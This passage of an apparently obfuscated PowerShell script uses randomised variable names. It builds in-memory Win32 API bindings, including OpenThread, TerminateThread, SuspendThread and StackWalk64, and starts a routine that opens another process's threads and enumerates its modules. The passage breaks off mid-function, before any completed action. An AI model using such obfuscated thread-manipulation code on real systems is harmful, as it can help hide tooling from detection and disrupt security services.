        ($9fHVCEzPCyBRX99.DefineField('FltF41', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x300)
        ($9fHVCEzPCyBRX99.DefineField('FltF42', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x310)
        ($9fHVCEzPCyBRX99.DefineField('FltF43', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x320)
        ($9fHVCEzPCyBRX99.DefineField('FltF44', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x330)
        ($9fHVCEzPCyBRX99.DefineField('FltF45', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x340)
        ($9fHVCEzPCyBRX99.DefineField('FltF46', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x350)
        ($9fHVCEzPCyBRX99.DefineField('FltF47', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x360)
        ($9fHVCEzPCyBRX99.DefineField('FltF48', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x370)
        ($9fHVCEzPCyBRX99.DefineField('FltF49', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x380)
        ($9fHVCEzPCyBRX99.DefineField('FltF50', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x390)
        ($9fHVCEzPCyBRX99.DefineField('FltF51', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x3a0)
        ($9fHVCEzPCyBRX99.DefineField('FltF52', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x3b0)
        ($9fHVCEzPCyBRX99.DefineField('FltF53', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x3c0)
        ($9fHVCEzPCyBRX99.DefineField('FltF54', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x3d0)
        ($9fHVCEzPCyBRX99.DefineField('FltF55', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x3e0)
        ($9fHVCEzPCyBRX99.DefineField('FltF56', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x3f0)
        ($9fHVCEzPCyBRX99.DefineField('FltF57', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x400)
        ($9fHVCEzPCyBRX99.DefineField('FltF58', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x410)
        ($9fHVCEzPCyBRX99.DefineField('FltF59', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x420)
        ($9fHVCEzPCyBRX99.DefineField('FltF60', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x430)
        ($9fHVCEzPCyBRX99.DefineField('FltF61', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x440)
        ($9fHVCEzPCyBRX99.DefineField('FltF62', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x450)
        ($9fHVCEzPCyBRX99.DefineField('FltF63', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x460)
        ($9fHVCEzPCyBRX99.DefineField('FltF64', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x470)
        ($9fHVCEzPCyBRX99.DefineField('FltF65', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x480)
        ($9fHVCEzPCyBRX99.DefineField('FltF66', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x490)
        ($9fHVCEzPCyBRX99.DefineField('FltF67', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x4a0)
        ($9fHVCEzPCyBRX99.DefineField('FltF68', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x4b0)
        ($9fHVCEzPCyBRX99.DefineField('FltF69', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x4c0)
        ($9fHVCEzPCyBRX99.DefineField('FltF70', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x4d0)
        ($9fHVCEzPCyBRX99.DefineField('FltF71', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x4e0)
        ($9fHVCEzPCyBRX99.DefineField('FltF72', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x4f0)
        ($9fHVCEzPCyBRX99.DefineField('FltF73', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x500)
        ($9fHVCEzPCyBRX99.DefineField('FltF74', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x510)
        ($9fHVCEzPCyBRX99.DefineField('FltF75', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x520)
        ($9fHVCEzPCyBRX99.DefineField('FltF76', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x530)
        ($9fHVCEzPCyBRX99.DefineField('FltF77', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x540)
        ($9fHVCEzPCyBRX99.DefineField('FltF78', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x550)
        ($9fHVCEzPCyBRX99.DefineField('FltF79', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x560)
        ($9fHVCEzPCyBRX99.DefineField('FltF80', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x570)
        ($9fHVCEzPCyBRX99.DefineField('FltF81', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x580)
        ($9fHVCEzPCyBRX99.DefineField('FltF82', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x590)
        ($9fHVCEzPCyBRX99.DefineField('FltF83', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x5a0)
        ($9fHVCEzPCyBRX99.DefineField('FltF84', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x5b0)
        ($9fHVCEzPCyBRX99.DefineField('FltF85', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x5c0)
        ($9fHVCEzPCyBRX99.DefineField('FltF86', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x5d0)
        ($9fHVCEzPCyBRX99.DefineField('FltF87', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x5e0)
        ($9fHVCEzPCyBRX99.DefineField('FltF88', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x5f0)
        ($9fHVCEzPCyBRX99.DefineField('FltF89', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x600)
        ($9fHVCEzPCyBRX99.DefineField('FltF90', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x610)
        ($9fHVCEzPCyBRX99.DefineField('FltF91', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x620)
        ($9fHVCEzPCyBRX99.DefineField('FltF92', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x630)
        ($9fHVCEzPCyBRX99.DefineField('FltF93', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x640)
        ($9fHVCEzPCyBRX99.DefineField('FltF94', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x650)
        ($9fHVCEzPCyBRX99.DefineField('FltF95', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x660)
        ($9fHVCEzPCyBRX99.DefineField('FltF96', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x670)
        ($9fHVCEzPCyBRX99.DefineField('FltF97', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x680)
        ($9fHVCEzPCyBRX99.DefineField('FltF98', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x690)
        ($9fHVCEzPCyBRX99.DefineField('FltF99', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x6a0)
        ($9fHVCEzPCyBRX99.DefineField('FltF100', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x6b0)
        ($9fHVCEzPCyBRX99.DefineField('FltF101', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x6c0)
        ($9fHVCEzPCyBRX99.DefineField('FltF102', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x6d0)
        ($9fHVCEzPCyBRX99.DefineField('FltF103', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x6e0)
        ($9fHVCEzPCyBRX99.DefineField('FltF104', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x6f0)
        ($9fHVCEzPCyBRX99.DefineField('FltF105', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x700)
        ($9fHVCEzPCyBRX99.DefineField('FltF106', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x710)
        ($9fHVCEzPCyBRX99.DefineField('FltF107', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x720)
        ($9fHVCEzPCyBRX99.DefineField('FltF108', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x730)
        ($9fHVCEzPCyBRX99.DefineField('FltF109', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x740)
        ($9fHVCEzPCyBRX99.DefineField('FltF110', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x750)
        ($9fHVCEzPCyBRX99.DefineField('FltF111', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x760)
        ($9fHVCEzPCyBRX99.DefineField('FltF112', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x770)
        ($9fHVCEzPCyBRX99.DefineField('FltF113', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x780)
        ($9fHVCEzPCyBRX99.DefineField('FltF114', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x790)
        ($9fHVCEzPCyBRX99.DefineField('FltF115', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x7a0)
        ($9fHVCEzPCyBRX99.DefineField('FltF116', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x7b0)
        ($9fHVCEzPCyBRX99.DefineField('FltF117', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x7c0)
        ($9fHVCEzPCyBRX99.DefineField('FltF118', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x7d0)
        ($9fHVCEzPCyBRX99.DefineField('FltF119', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x7e0)
        ($9fHVCEzPCyBRX99.DefineField('FltF120', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x7f0)
        ($9fHVCEzPCyBRX99.DefineField('FltF121', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x800)
        ($9fHVCEzPCyBRX99.DefineField('FltF122', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x810)
        ($9fHVCEzPCyBRX99.DefineField('FltF123', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x820)
        ($9fHVCEzPCyBRX99.DefineField('FltF124', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x830)
        ($9fHVCEzPCyBRX99.DefineField('FltF125', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x840)
        ($9fHVCEzPCyBRX99.DefineField('FltF126', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x850)
        ($9fHVCEzPCyBRX99.DefineField('FltF127', $g9bxVTrxvZSRMxP, 'Public')).SetOffset(0x860)
        ($9fHVCEzPCyBRX99.DefineField('StFPSR', [UInt64], 'Public')).SetOffset(0x870)
        ($9fHVCEzPCyBRX99.DefineField('IntGp', [UInt64], 'Public')).SetOffset(0x870)
        ($9fHVCEzPCyBRX99.DefineField('IntT0', [UInt64], 'Public')).SetOffset(0x880)
        ($9fHVCEzPCyBRX99.DefineField('IntT1', [UInt64], 'Public')).SetOffset(0x888)
        ($9fHVCEzPCyBRX99.DefineField('IntS0', [UInt64], 'Public')).SetOffset(0x890)
        ($9fHVCEzPCyBRX99.DefineField('IntS1', [UInt64], 'Public')).SetOffset(0x898)
        ($9fHVCEzPCyBRX99.DefineField('IntS2', [UInt64], 'Public')).SetOffset(0x8a0)
        ($9fHVCEzPCyBRX99.DefineField('IntS3', [UInt64], 'Public')).SetOffset(0x8a8)
        ($9fHVCEzPCyBRX99.DefineField('IntV0', [UInt64], 'Public')).SetOffset(0x8b0)
        ($9fHVCEzPCyBRX99.DefineField('IntT2', [UInt64], 'Public')).SetOffset(0x8b8)
        ($9fHVCEzPCyBRX99.DefineField('IntT3', [UInt64], 'Public')).SetOffset(0x8c0)
        ($9fHVCEzPCyBRX99.DefineField('IntT4', [UInt64], 'Public')).SetOffset(0x8c8)
        ($9fHVCEzPCyBRX99.DefineField('IntSp', [UInt64], 'Public')).SetOffset(0x8d0)
        ($9fHVCEzPCyBRX99.DefineField('IntTeb', [UInt64], 'Public')).SetOffset(0x8d8)
        ($9fHVCEzPCyBRX99.DefineField('IntT5', [UInt64], 'Public')).SetOffset(0x8e0)
        ($9fHVCEzPCyBRX99.DefineField('IntT6', [UInt64], 'Public')).SetOffset(0x8e8)
        ($9fHVCEzPCyBRX99.DefineField('IntT7', [UInt64], 'Public')).SetOffset(0x8f0)
        ($9fHVCEzPCyBRX99.DefineField('IntT8', [UInt64], 'Public')).SetOffset(0x8f8)
        ($9fHVCEzPCyBRX99.DefineField('IntT9', [UInt64], 'Public')).SetOffset(0x900)
        ($9fHVCEzPCyBRX99.DefineField('IntT10', [UInt64], 'Public')).SetOffset(0x908)
        ($9fHVCEzPCyBRX99.DefineField('IntT11', [UInt64], 'Public')).SetOffset(0x910)
        ($9fHVCEzPCyBRX99.DefineField('IntT12', [UInt64], 'Public')).SetOffset(0x918)
        ($9fHVCEzPCyBRX99.DefineField('IntT13', [UInt64], 'Public')).SetOffset(0x920)
        ($9fHVCEzPCyBRX99.DefineField('IntT14', [UInt64], 'Public')).SetOffset(0x928)
        ($9fHVCEzPCyBRX99.DefineField('IntT15', [UInt64], 'Public')).SetOffset(0x930)
        ($9fHVCEzPCyBRX99.DefineField('IntT16', [UInt64], 'Public')).SetOffset(0x938)
        ($9fHVCEzPCyBRX99.DefineField('IntT17', [UInt64], 'Public')).SetOffset(0x940)
        ($9fHVCEzPCyBRX99.DefineField('IntT18', [UInt64], 'Public')).SetOffset(0x948)
        ($9fHVCEzPCyBRX99.DefineField('IntT19', [UInt64], 'Public')).SetOffset(0x950)
        ($9fHVCEzPCyBRX99.DefineField('IntT20', [UInt64], 'Public')).SetOffset(0x958)
        ($9fHVCEzPCyBRX99.DefineField('IntT21', [UInt64], 'Public')).SetOffset(0x960)
        ($9fHVCEzPCyBRX99.DefineField('IntT22', [UInt64], 'Public')).SetOffset(0x968)
        ($9fHVCEzPCyBRX99.DefineField('IntNats', [UInt64], 'Public')).SetOffset(0x970)
        ($9fHVCEzPCyBRX99.DefineField('Preds', [UInt64], 'Public')).SetOffset(0x978)
        ($9fHVCEzPCyBRX99.DefineField('BrRp', [UInt64], 'Public')).SetOffset(0x980)
        ($9fHVCEzPCyBRX99.DefineField('BrS0', [UInt64], 'Public')).SetOffset(0x988)
        ($9fHVCEzPCyBRX99.DefineField('BrS1', [UInt64], 'Public')).SetOffset(0x990)
        ($9fHVCEzPCyBRX99.DefineField('BrS2', [UInt64], 'Public')).SetOffset(0x998)
        ($9fHVCEzPCyBRX99.DefineField('BrS3', [UInt64], 'Public')).SetOffset(0x9a0)
        ($9fHVCEzPCyBRX99.DefineField('BrS4', [UInt64], 'Public')).SetOffset(0x9a8)
        ($9fHVCEzPCyBRX99.DefineField('BrT0', [UInt64], 'Public')).SetOffset(0x9b0)
        ($9fHVCEzPCyBRX99.DefineField('BrT1', [UInt64], 'Public')).SetOffset(0x9b8)
        ($9fHVCEzPCyBRX99.DefineField('ApUNAT', [UInt64], 'Public')).SetOffset(0x9c0)
        ($9fHVCEzPCyBRX99.DefineField('ApLC', [UInt64], 'Public')).SetOffset(0x9c8)
        ($9fHVCEzPCyBRX99.DefineField('ApEC', [UInt64], 'Public')).SetOffset(0x9d0)
        ($9fHVCEzPCyBRX99.DefineField('ApCCV', [UInt64], 'Public')).SetOffset(0x9d8)
        ($9fHVCEzPCyBRX99.DefineField('ApDCR', [UInt64], 'Public')).SetOffset(0x9e0)
        ($9fHVCEzPCyBRX99.DefineField('RsPFS', [UInt64], 'Public')).SetOffset(0x9e8)
        ($9fHVCEzPCyBRX99.DefineField('RsBSP', [UInt64], 'Public')).SetOffset(0x9f0)
        ($9fHVCEzPCyBRX99.DefineField('RsBSPSTORE', [UInt64], 'Public')).SetOffset(0x9f8)
        ($9fHVCEzPCyBRX99.DefineField('RsRSC', [UInt64], 'Public')).SetOffset(0xa00)
        ($9fHVCEzPCyBRX99.DefineField('RsRNAT', [UInt64], 'Public')).SetOffset(0xa08)
        ($9fHVCEzPCyBRX99.DefineField('StIPSR', [UInt64], 'Public')).SetOffset(0xa10)
        ($9fHVCEzPCyBRX99.DefineField('StIIP', [UInt64], 'Public')).SetOffset(0xa18)
        ($9fHVCEzPCyBRX99.DefineField('StIFS', [UInt64], 'Public')).SetOffset(0xa20)
        ($9fHVCEzPCyBRX99.DefineField('StFCR', [UInt64], 'Public')).SetOffset(0xa28)
        ($9fHVCEzPCyBRX99.DefineField('Eflag', [UInt64], 'Public')).SetOffset(0xa30)
        ($9fHVCEzPCyBRX99.DefineField('SegCSD', [UInt64], 'Public')).SetOffset(0xa38)
        ($9fHVCEzPCyBRX99.DefineField('SegSSD', [UInt64], 'Public')).SetOffset(0xa40)
        ($9fHVCEzPCyBRX99.DefineField('Cflag', [UInt64], 'Public')).SetOffset(0xa48)
        ($9fHVCEzPCyBRX99.DefineField('StFSR', [UInt64], 'Public')).SetOffset(0xa50)
        ($9fHVCEzPCyBRX99.DefineField('StFIR', [UInt64], 'Public')).SetOffset(0xa58)
        ($9fHVCEzPCyBRX99.DefineField('StFDR', [UInt64], 'Public')).SetOffset(0xa60)
        ($9fHVCEzPCyBRX99.DefineField('UNUSEDPACK', [UInt64], 'Public')).SetOffset(0xa68)
        $fhqHVSecULqcDD9:IA64_CONTEXT = $9fHVCEzPCyBRX99.CreateType()




        function local:func {

            Param (
                [Parameter(Position = 0, Mandatory = $true)]
                [String]$DllName,

                [Parameter(Position = 1, Mandatory = $true)]
                [string]$FunctionName,

                [Parameter(Position = 2, Mandatory = $true)]
                [Type]$ReturnType,

                [Parameter(Position = 3)]
                [Type[]]$ParameterTypes,

                [Parameter(Position = 4)]
                [Runtime.InteropServices.CallingConvention]$NativeCallingConvention,

                [Parameter(Position = 5)]
                [Runtime.InteropServices.CharSet]$Charset,

                [Parameter()]
                [Switch]$SetLastError
            )
            $K9VfQRTInoOh9Wa = @{
                DllName      = $DllName
                FunctionName = $FunctionName
                ReturnType   = $ReturnType
            }
            if ($ParameterTypes) { $K9VfQRTInoOh9Wa['ParameterTypes'] = $ParameterTypes }
            if ($NativeCallingConvention) { $K9VfQRTInoOh9Wa['NativeCallingConvention'] = $NativeCallingConvention }
            if ($Charset) { $K9VfQRTInoOh9Wa['Charset'] = $Charset }
            if ($SetLastError) { $K9VfQRTInoOh9Wa['SetLastError'] = $SetLastError }
            New-Object -TypeName PSObject -Property $K9VfQRTInoOh9Wa
        }
        function local:Add-Win32Type {

            [OutputType([Hashtable])]
            Param(
                [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
                [String]$DllName,

                [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
                [String]$FunctionName,

                [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
                [Type]$ReturnType,

                [Parameter(ValueFromPipelineByPropertyName = $true)]
                [Type[]]$ParameterTypes,

                [Parameter(ValueFromPipelineByPropertyName = $true)]
                [Runtime.InteropServices.CallingConvention]$NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

                [Parameter(ValueFromPipelineByPropertyName = $true)]
                [Runtime.InteropServices.CharSet]$Charset = [Runtime.InteropServices.CharSet]::Auto,

                [Parameter(ValueFromPipelineByPropertyName = $true)]
                [Switch]$SetLastError,

                [Parameter(Mandatory = $true)]
                [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]$Module,

                [ValidateNotNull()]
                [String]$Namespace = ''
            )
            BEGIN { $ez9sZQdtoFBMbk9 = @{} }
            PROCESS {
                if ($Module -is [Reflection.Assembly])
                {
                    if ($Namespace)
                    {
                        $ez9sZQdtoFBMbk9[$DllName] = $Module.GetType("$Namespace.$DllName")
                    }
                    else
                    {
                        $ez9sZQdtoFBMbk9[$DllName] = $Module.GetType($DllName)
                    }
                }
                else # Define one type for each DLL
                {
                    if (!$ez9sZQdtoFBMbk9.ContainsKey($DllName))
                    {
                        if ($Namespace)
                        {
                            $ez9sZQdtoFBMbk9[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                        }
                        else
                        {
                            $ez9sZQdtoFBMbk9[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                        }
                    }

                    $mfNlLAiKHtvZJGf = $ez9sZQdtoFBMbk9[$DllName].DefineMethod($FunctionName, 'Public,Static,PinvokeImpl', $ReturnType, $ParameterTypes)


                    $i = 1
                    foreach($IeUQzBuYUijzPNN in $ParameterTypes)
                    {
                        if ($IeUQzBuYUijzPNN.IsByRef)
                        {
                            [void]$mfNlLAiKHtvZJGf.DefineParameter($i, 'Out', $null)
                        }
                        $i++
                    }

                    $KtVRNL9Sc9vMN9F = [Runtime.InteropServices.DllImportAttribute]
                    $FB9kxv9jyLyOakx = $KtVRNL9Sc9vMN9F.GetField('SetLastError')
                    $epMcnV9XisrFWWl = $KtVRNL9Sc9vMN9F.GetField('CallingConvention')
                    $vMdUSYPpWIhRcws = $KtVRNL9Sc9vMN9F.GetField('CharSet')
                    if ($SetLastError)
                    {
                        $sWJkQEjymZhfmsi = $true
                    }
                    else
                    {
                        $sWJkQEjymZhfmsi = $false
                    }


                    $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
                    $q9hhhUSLnI9xBmA = New-Object -TypeName Reflection.Emit.CustomAttributeBuilder -ArgumentList ($Constructor, $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(), [Reflection.FieldInfo[]] @($FB9kxv9jyLyOakx, $epMcnV9XisrFWWl, $vMdUSYPpWIhRcws), [Object[]] @($sWJkQEjymZhfmsi, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))
                    $mfNlLAiKHtvZJGf.SetCustomAttribute($q9hhhUSLnI9xBmA)
                }
            }
            END {
                if ($Module -is [Reflection.Assembly])
                {
                    return $ez9sZQdtoFBMbk9
                }
                $ZszWKWkgKQQNXCu = @{}
                foreach ($Key in $ez9sZQdtoFBMbk9.Keys)
                {
                    $Type = $ez9sZQdtoFBMbk9[$Key].CreateType()
                    $ZszWKWkgKQQNXCu[$Key] = $Type
                }
                return $ZszWKWkgKQQNXCu
            }
        }
        function local:Get-DelegateType {
            Param (
                [OutputType([Type])]

                [Parameter( Position = 0)]
                [Type[]]$dSEHR9kItsAYBPz = (New-Object -TypeName Type[] -ArgumentList (0)),

                [Parameter( Position = 1 )]
                [Type]$ReturnType = [Void]
            )
            $Bn9WoqHKBpWeFCu = [AppDomain]::CurrentDomain
            $snQMNX9JpaaPyef = New-Object -TypeName System.Reflection.AssemblyName -ArgumentList ('ReflectedDelegate')
            $mv99P9xzgkvSrGQ = $Bn9WoqHKBpWeFCu.DefineDynamicAssembly($snQMNX9JpaaPyef, [Reflection.Emit.AssemblyBuilderAccess]::Run)
            $zfgSAXsTKOt99qC = $mv99P9xzgkvSrGQ.DefineDynamicModule('InMemoryModule', $false)
            $9fHVCEzPCyBRX99 = $zfgSAXsTKOt99qC.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
            $vbZ9TKHtVRJVVwh = $9fHVCEzPCyBRX99.DefineConstructor('RTSpecialName, HideBySig, Public', [Reflection.CallingConventions]::Standard, $dSEHR9kItsAYBPz)
            $vbZ9TKHtVRJVVwh.SetImplementationFlags('Runtime, Managed')
            $hJctRjCCEOAZlNc = $9fHVCEzPCyBRX99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $dSEHR9kItsAYBPz)
            $hJctRjCCEOAZlNc.SetImplementationFlags('Runtime, Managed')
            $9fHVCEzPCyBRX99.CreateType()
        }

        $FunctionDefinitions = @(

            (func kernel32 OpenProcess ([IntPtr]) @([Int32], [Bool], [Int32]) -SetLastError),
            (func kernel32 OpenThread ([IntPtr]) @([Int32], [Bool], [Int32]) -SetLastError),
            (func kernel32 TerminateThread ([IntPtr]) @([Int32], [Int32]) -SetLastError),
            (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
            (func kernel32 Wow64SuspendThread ([UInt32]) @([IntPtr]) -SetLastError),
            (func kernel32 SuspendThread ([UInt32]) @([IntPtr]) -SetLastError),
            (func kernel32 ResumeThread ([UInt32]) @([IntPtr]) -SetLastError),
            (func kernel32 Wow64GetThreadContext ([Bool]) @([IntPtr], [IntPtr]) -SetLastError),
            (func kernel32 GetThreadContext ([Bool]) @([IntPtr], [IntPtr]) -SetLastError),
            (func kernel32 GetSystemInfo ([Void]) @($R9r9dgVZNaRJMzi.MakeByRefType()) -SetLastError),
            (func kernel32 IsWow64Process ([Bool]) @([IntPtr], [Bool].MakeByRefType()) -SetLastError),


            (func psapi EnumProcessModulesEx ([Bool]) @([IntPtr], [IntPtr].MakeArrayType(), [UInt32], [UInt32].MakeByRefType(), [Int32]) -SetLastError),
            (func psapi GetModuleInformation ([Bool]) @([IntPtr], [IntPtr], $9K9FvfIVuBQL9Rb.MakeByRefType(), [UInt32]) -SetLastError),
            (func psapi GetModuleBaseNameW ([UInt32]) @([IntPtr], [IntPtr], [Text.StringBuilder], [Int32]) -Charset Unicode -SetLastError),
            (func psapi GetModuleFileNameExW ([UInt32]) @([IntPtr], [IntPtr], [Text.StringBuilder], [Int32]) -Charset Unicode -SetLastError),
            (func psapi GetMappedFileNameW ([UInt32]) @([IntPtr], [IntPtr], [Text.StringBuilder], [Int32]) -Charset Unicode -SetLastError),


            (func dbghelp SymInitialize ([Bool]) @([IntPtr], [String], [Bool]) -SetLastError),
            (func dbghelp SymCleanup ([Bool]) @([IntPtr]) -SetLastError),
            (func dbghelp SymFunctionTableAccess64 ([IntPtr]) @([IntPtr], [UInt64]) -SetLastError),
            (func dbghelp SymGetModuleBase64 ([UInt64]) @([IntPtr], [UInt64]) -SetLastError),
            (func dbghelp SymGetSymFromAddr64 ([Bool]) @([IntPtr], [UInt64], [UInt64], [IntPtr]) -SetLastError),
            (func dbghelp SymLoadModuleEx ([UInt64]) @([IntPtr], [IntPtr], [String], [String], [IntPtr], [Int32], [IntPtr], [Int32]) -SetLastError),
            (func dbghelp StackWalk64 ([Bool]) @([UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [MulticastDelegate], [MulticastDelegate], [MulticastDelegate], [MulticastDelegate]))
        )
        $Types = $FunctionDefinitions | Add-Win32Type -Module $zfgSAXsTKOt99qC -Namespace 'Win32'
        $fhqHVSecULqcDD9:Kernel32 = $Types['kernel32']
        $fhqHVSecULqcDD9:Psapi = $Types['psapi']
        $fhqHVSecULqcDD9:Dbghelp = $Types['dbghelp']

        function local:Trace-Thread {
            Param (
                [Parameter()]
                [IntPtr]$p9f9AtUPt9d9KD9,

                [Parameter()]
                [Int]$ghkYPCiRqZkIXZe,

                [Parameter()]
                [Int]$OsOdK9FSHQbEpCk
            )


            if (($FdnZhmsAaP9GBgC = $Kernel32::OpenThread(0x1F03FF, $false, $ghkYPCiRqZkIXZe)) -eq 0) {
                Write-Error "Unable to open handle for thread $ghkYPCiRqZkIXZe."
                return
            }


            function local:Get-SystemInfo {
                $QtvWuEsaYAPDjJh = [Activator]::CreateInstance($R9r9dgVZNaRJMzi)
                [void]$Kernel32::GetSystemInfo([ref]$QtvWuEsaYAPDjJh)

                Write-Output -InputObject $QtvWuEsaYAPDjJh
            }
            function local:Import-ModuleSymbols {
                Param (
                    [Parameter(Mandatory = $true)]
                    [IntPtr]$p9f9AtUPt9d9KD9
                )


                $GkTTIhzT9RtqD9S = 0
                if (!$Psapi::EnumProcessModulesEx($p9f9AtUPt9d9KD9, $null, 0, [ref]$GkTTIhzT9RtqD9S, 3)) {
                    Write-Error 'Failed to get buffer size for module handles.'
                    return
                }

                $VxdEGtYVntWNG9N = $GkTTIhzT9RtqD9S / [IntPtr]::Size
                $EsakvLPHdqFILrx = New-Object -TypeName IntPtr[] -ArgumentList $VxdEGtYVntWNG9N

                $cb = $GkTTIhzT9RtqD9S
                if (!$Psapi::EnumProcessModulesEx($p9f9AtUPt9d9KD9, $EsakvLPHdqFILrx, $cb, [ref]$GkTTIhzT9RtqD9S, 3)) {
                    Write-Error 'Failed to get module handles for process.'
                    return
                }
                for ($i = 0; $i -lt $VxdEGtYVntWNG9N; $i++)
                {
                    $eh9WqtNYQJiWjns = [Activator]::CreateInstance($9K9FvfIVuBQL9Rb)
                    $zShtHErkIzIGD9c = New-Object Text.StringBuilder(256)
                    $ZKlOfgPMCqaFPeE = New-Object Text.StringBuilder(32)

                    if (!$Psapi::GetModuleFileNameExW($p9f9AtUPt9d9KD9, $EsakvLPHdqFILrx[$i], $zShtHErkIzIGD9c, $zShtHErkIzIGD9c.Capacity)) {
                        Write-Error 'Failed to get module file name.'
                        continue
                    }
                    if (!$Psapi::GetModuleBaseNameW($p9f9AtUPt9d9KD9, $EsakvLPHdqFILrx[$i], $ZKlOfgPMCqaFPeE, $ZKlOfgPMCqaFPeE.Capacity)) {
                        Write-Error "Failed to get module base name for $($zShtHErkIzIGD9c.ToString())."
                        continue
                    }
                    if (!$Psapi::GetModuleInformation($p9f9AtUPt9d9KD9, $EsakvLPHdqFILrx[$i], [ref]$eh9WqtNYQJiWjns,  [Runtime.InteropServices.Marshal]::SizeOf($eh9WqtNYQJiWjns))) {
                        Write-Error "Failed to get module information for module $($ZKlOfgPMCqaFPeE.ToString())."
                        continue
                    }
